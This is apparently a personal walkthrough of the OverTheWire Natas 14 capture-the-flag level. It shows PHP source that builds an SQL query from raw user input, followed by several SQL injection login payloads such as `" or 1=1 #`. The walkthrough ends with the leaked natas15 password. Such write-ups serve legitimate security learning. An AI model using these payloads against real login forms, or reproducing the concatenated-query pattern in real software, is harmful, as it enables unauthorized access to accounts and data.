---
title: natas 14 walkthrough
description: over the wire natas 14
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-14 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 14 walkthrough
    order: 30
---
## Description
>    Username: natas14
> 
>     URL:      http://natas14.natas.labs.overthewire.org

### Source Code 
```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
}
?>
```

---
## Progress
### Observation
Server is using sql query. Definitely need to use [[sql injection MOC]].
### Trial
#### Case 1 
Username : `3" or 1=1 --`
Password : `k`

Failed with error message : **Warning**: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in **/var/www/natas/natas14/index.php** on line **24**
#### Case 2
Username : `3" or 1=1 #`
Password : `k`
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
#### Case 3
Username : `3" or 1=1 -- `
Password : `k`
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

---
## Hint

---
## Solving
### Category
- [[sql injection MOC]]
### Techniques
- 

### Tools
- 